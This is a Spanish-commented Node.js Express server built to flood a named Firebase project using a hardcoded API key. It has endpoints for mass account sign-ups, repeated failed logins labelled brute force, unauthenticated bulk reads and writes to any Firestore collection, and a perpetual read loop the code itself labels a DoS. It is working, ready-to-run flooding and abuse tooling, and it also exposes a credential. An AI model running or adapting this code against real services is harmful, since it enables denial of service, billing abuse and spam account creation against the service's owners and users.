const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// Credenciales (API Key pública)
const API_KEY = 'AIzaSyBx9Np7t_-loUBFX-m-bfFAvjn4dvlkk-s';
const PROJECT_ID = 'magiccal1';
const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents`;

// ========== REGISTRAR USUARIO (original) ==========
async function registrarUsuario() {
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}`;
  const email = `test_${Date.now()}@example.com`;
  const password = 'test123456';
  try {
    const response = await axios.post(url, { email, password, returnSecureToken: true });
    return { success: true, idToken: response.data.idToken, localId: response.data.localId, email: response.data.email };
  } catch (error) {
    return { success: false, error: error.response?.data?.error?.message || error.message };
  }
}

// ========== CREAR VENTA CON AUTENTICACIÓN (original) ==========
async function crearVentaConAuth(index, idToken) {
  const ahora = new Date().toISOString();
  const venta = {
    fields: {
      userId: { stringValue: `test_user_${Math.floor(Math.random() * 100)}` },
      fecha: { timestampValue: ahora },
      totalBs: { doubleValue: Math.random() * 1000 },
      totalUsd: { doubleValue: Math.random() * 25 },
      metodosPagoVenta: { arrayValue: { values: [{ mapValue: { fields: { metodo: { stringValue: 'Efectivo' }, monto: { doubleValue: 100 } } } }] } },
      productos: { arrayValue: { values: [{ mapValue: { fields: { nombre: { stringValue: 'Producto Test' }, cantidad: { integerValue: 1 }, precioUsd: { doubleValue: 1 } } } }] } },
      nota: { stringValue: `Prueba con auth #${index} - ${ahora}` }
    }
  };
  const url = `${FIRESTORE_URL}/ventas`;
  try {
    const response = await axios.post(url, venta, { headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${idToken}` } });
    return { success: true, id: response.data.name };
  } catch (error) {
    return { success: false, error: error.response?.data?.error?.message || error.message };
  }
}

// ========== ENDPOINT ORIGINAL: ESTRÉS CON AUTENTICACIÓN ==========
app.get('/stress-auth/:cantidad', async (req, res) => {
  const cantidad = parseInt(req.params.cantidad);
  if (isNaN(cantidad) || cantidad < 1) return res.status(400).json({ error: 'Cantidad positiva' });
  if (cantidad > 5000) return res.status(400).json({ error: 'Máximo 5000' });

  const registro = await registrarUsuario();
  if (!registro.success) return res.status(500).json({ error: 'Fallo al registrar usuario', detalle: registro.error });
  const { idToken } = registro;

  console.log(`🚀 Iniciando bombardeo autenticado de ${cantidad} transacciones...`);
  const startTime = Date.now();
  let exitosas = 0, fallidas = 0;
  const errores = [];

  const concurrencia = 20;
  for (let i = 0; i < cantidad; i += concurrencia) {
    const lote = [];
    const fin = Math.min(i + concurrencia, cantidad);
    for (let j = i; j < fin; j++) lote.push(crearVentaConAuth(j, idToken));
    const resultados = await Promise.allSettled(lote);
    for (const r of resultados) {
      if (r.status === 'fulfilled' && r.value.success) exitosas++;
      else { fallidas++; errores.push(r.value?.error || r.reason?.message || 'Error'); }
    }
    if (i + concurrencia < cantidad) await new Promise(resolve => setTimeout(resolve, 100));
  }

  const elapsed = (Date.now() - startTime) / 1000;
  res.json({ total: cantidad, exitosas, fallidas, errores: errores.slice(0, 10), tiempoSegundos: elapsed });
});

// ========== REGISTRO MASIVO SIN ESCRITURA ==========
async function registrarSoloUsuario(index, resultados) {
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}`;
  const email = `stress_${Date.now()}_${index}@example.com`;
  const password = 'test123456';
  try {
    await axios.post(url, { email, password, returnSecureToken: false });
    resultados.exitosas++;
  } catch (error) {
    resultados.fallidas++;
    resultados.errores.push(error.response?.data?.error?.message || error.message);
  }
}
app.get('/stress-register/:cantidad', async (req, res) => {
  const cantidad = parseInt(req.params.cantidad);
  if (isNaN(cantidad) || cantidad < 1) return res.status(400).json({ error: 'Cantidad positiva' });
  if (cantidad > 5000) return res.status(400).json({ error: 'Máximo 5000' });

  const resultados = { exitosas: 0, fallidas: 0, errores: [] };
  const startTime = Date.now();
  const concurrencia = 20;
  for (let i = 0; i < cantidad; i += concurrencia) {
    const lote = [];
    const fin = Math.min(i + concurrencia, cantidad);
    for (let j = i; j < fin; j++) lote.push(registrarSoloUsuario(j, resultados));
    await Promise.allSettled(lote);
    if (i + concurrencia < cantidad) await new Promise(r => setTimeout(r, 50));
  }
  const elapsed = (Date.now() - startTime) / 1000;
  res.json({ total: cantidad, exitosas: resultados.exitosas, fallidas: resultados.fallidas, errores: resultados.errores.slice(0, 10), tiempoSegundos: elapsed });
});

// ========== LOGIN MASIVO (FUERZA BRUTA) ==========
async function intentarLogin(index, resultados) {
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;
  const email = `fakeuser_${Date.now()}_${index}@example.com`;
  const password = 'wrongpassword';
  try {
    await axios.post(url, { email, password, returnSecureToken: false });
    resultados.exitosas++;
  } catch (error) {
    resultados.fallidas++;
    resultados.errores.push(error.response?.data?.error?.message || error.message);
  }
}
app.get('/stress-login/:cantidad', async (req, res) => {
  const cantidad = parseInt(req.params.cantidad);
  if (isNaN(cantidad) || cantidad < 1) return res.status(400).json({ error: 'Cantidad positiva' });
  if (cantidad > 5000) return res.status(400).json({ error: 'Máximo 5000' });

  const resultados = { exitosas: 0, fallidas: 0, errores: [] };
  const startTime = Date.now();
  const concurrencia = 20;
  for (let i = 0; i < cantidad; i += concurrencia) {
    const lote = [];
    const fin = Math.min(i + concurrencia, cantidad);
    for (let j = i; j < fin; j++) lote.push(intentarLogin(j, resultados));
    await Promise.allSettled(lote);
    if (i + concurrencia < cantidad) await new Promise(r => setTimeout(r, 50));
  }
  const elapsed = (Date.now() - startTime) / 1000;
  res.json({ total: cantidad, exitosas: resultados.exitosas, fallidas: resultados.fallidas, errores: resultados.errores.slice(0, 10), tiempoSegundos: elapsed });
});

// ========== LECTURA MASIVA DE FIRESTORE ==========
app.get('/stress-read/:coleccion/:cantidad', async (req, res) => {
  const coleccion = req.params.coleccion;
  const cantidad = parseInt(req.params.cantidad);
  if (isNaN(cantidad) || cantidad < 1) return res.status(400).json({ error: 'Cantidad positiva' });
  if (cantidad > 1000) return res.status(400).json({ error: 'Máximo 1000 lecturas' });

  const url = `${FIRESTORE_URL}/${coleccion}?key=${API_KEY}`;
  let exitosas = 0, fallidas = 0, errores = [];

  const start = Date.now();
  const concurrencia = 20;
  for (let i = 0; i < cantidad; i += concurrencia) {
    const lote = [];
    const fin = Math.min(i + concurrencia, cantidad);
    for (let j = i; j < fin; j++) {
      lote.push(
        axios.get(url).then(() => { exitosas++; }).catch(err => {
          fallidas++;
          errores.push(err.response?.data?.error?.message || err.message);
        })
      );
    }
    await Promise.allSettled(lote);
    if (i + concurrencia < cantidad) await new Promise(r => setTimeout(r, 50));
  }

  res.json({
    coleccion,
    total: cantidad,
    exitosas,
    fallidas,
    errores: errores.slice(0, 10),
    tiempoSegundos: (Date.now() - start) / 1000
  });
});

// ========== ESCRITURA MASIVA (genérica) ==========
app.get('/stress-write/:coleccion/:cantidad', async (req, res) => {
  const coleccion = req.params.coleccion;
  const cantidad = parseInt(req.params.cantidad);
  if (isNaN(cantidad) || cantidad < 1) return res.status(400).json({ error: 'Cantidad positiva' });
  if (cantidad > 1000) return res.status(400).json({ error: 'Máximo 1000 escrituras' });

  const url = `${FIRESTORE_URL}/${coleccion}?key=${API_KEY}`;
  let exitosas = 0, fallidas = 0, errores = [];

  const start = Date.now();
  const concurrencia = 20;
  for (let i = 0; i < cantidad; i += concurrencia) {
    const lote = [];
    const fin = Math.min(i + concurrencia, cantidad);
    for (let j = i; j < fin; j++) {
      const doc = {
        fields: {
          test: { stringValue: `stress_${Date.now()}_${j}` },
          createdAt: { timestampValue: new Date().toISOString() }
        }
      };
      lote.push(
        axios.post(url, doc, { headers: { 'Content-Type': 'application/json' } })
          .then(() => { exitosas++; })
          .catch(err => {
            fallidas++;
            errores.push(err.response?.data?.error?.message || err.message);
          })
      );
    }
    await Promise.allSettled(lote);
    if (i + concurrencia < cantidad) await new Promise(r => setTimeout(r, 50));
  }

  res.json({
    coleccion,
    total: cantidad,
    exitosas,
    fallidas,
    errores: errores.slice(0, 10),
    tiempoSegundos: (Date.now() - start) / 1000
  });
});

// ========== LECTURA PERPETUA (DoS de lecturas) ==========
let runningLoops = new Map();

async function perpetualReadCycle(coleccion, delayMs, loopId, resultados) {
  let pageToken = null;
  try {
    while (runningLoops.has(loopId)) {
      const url = `${FIRESTORE_URL}/${coleccion}?key=${API_KEY}&pageSize=100` +
                  (pageToken ? `&pageToken=${pageToken}` : '');
      try {
        const response = await axios.get(url);
        const data = response.data;
        const docs = data.documents || [];
        resultados.totalDocs += docs.length;
        resultados.pagesRead++;
        pageToken = data.nextPageToken || null;
        // Si no hay más páginas, reinicia para seguir leyendo
        if (!pageToken) pageToken = null;
        if (delayMs > 0) await new Promise(r => setTimeout(r, delayMs));
      } catch (err) {
        console.error(`Error en loop ${loopId}:`, err.message);
        await new Promise(r => setTimeout(r, 1000));
      }
    }
  } catch (e) {
    console.error(`Loop ${loopId} detenido por excepción:`, e.message);
  }
  runningLoops.delete(loopId);
}

app.get('/stress-read-forever/:coleccion', (req, res) => {
  const coleccion = req.params.coleccion;
  const paralelo = parseInt(req.query.parallel) || 1;
  const delay = parseInt(req.query.delay) || 200;
  const tiempoMax = parseInt(req.query.maxTime) || 0;

  if (paralelo < 1 || paralelo > 10) return res.status(400).json({ error: 'Paralelo entre 1 y 10' });
  if (delay < 0 || delay > 5000) return res.status(400).json({ error: 'Delay entre 0 y 5000 ms' });

  const resultados = { totalDocs: 0, pagesRead: 0, loops: paralelo, delay };
  for (let i = 0; i < paralelo; i++) {
    const loopId = `${Date.now()}-${i}`;
    runningLoops.set(loopId, true);
    perpetualReadCycle(coleccion, delay, loopId, resultados);
  }

  if (tiempoMax > 0) {
    setTimeout(() => {
      for (const loopId of runningLoops.keys()) runningLoops.set(loopId, false);
      runningLoops.clear();
    }, tiempoMax * 1000);
  }

  res.json({
    message: `🔥 Lectura perpetua iniciada en colección '${coleccion}' con ${paralelo} hilos, delay ${delay}ms.`,
    stopEndpoint: '/stress-stop-read-forever',
    statusEndpoint: '/stress-read-forever-status'
  });
});

app.get('/stress-stop-read-forever', (req, res) => {
  for (const loopId of runningLoops.keys()) runningLoops.set(loopId, false);
  runningLoops.clear();
  res.json({ message: 'Todos los loops de lectura detenidos.' });
});

app.get('/stress-read-forever-status', (req, res) => {
  res.json({ activeLoops: runningLoops.size });
});

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => res.send('OK'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🔥 Stress server corriendo en puerto ${PORT}`));
